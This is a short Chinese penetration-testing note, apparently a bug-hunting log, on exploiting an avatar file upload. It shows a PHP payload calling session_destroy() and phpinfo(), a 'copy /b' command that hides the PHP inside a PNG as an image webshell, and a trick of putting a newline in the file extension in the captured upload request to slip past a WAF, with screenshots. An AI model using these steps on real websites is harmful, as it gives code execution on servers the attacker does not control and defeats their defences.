##### 问题：

日常挖洞的时候碰到一个文件上传、发现可以上传 php 可执行文件、但是浏览的时候报 session\_start() 错误

![](../Images/19098322bc0861799f6ac1e614f745de.png)

##### 解决方法：  

![](../Images/c37253683cd21b8e766cee19901dd4df.png)

##### 案例：  

因为是头像上传处、同时网站还有 Waf、所有需要上传一个图片Webshell。新建一个PHP：1.php

```
<?php
    session\_destroy();
    phpinfo();
?>
```

> 再准备一个图片、越小越好、当时就是因为图片有点大、然后上传上去就报错了。

生成一个图片 Webshell

```
copy 1.png/b + 1.php/a shell.png
```

![](../Images/e9cf9a90159d780f3eefd2278bc37960.png)

上传抓取数据包、修改后缀名（后缀名回车绕过Waf）  

![](../Images/6779d68f89dc0ee6a1732db90e30bc2f.png)

成功执行
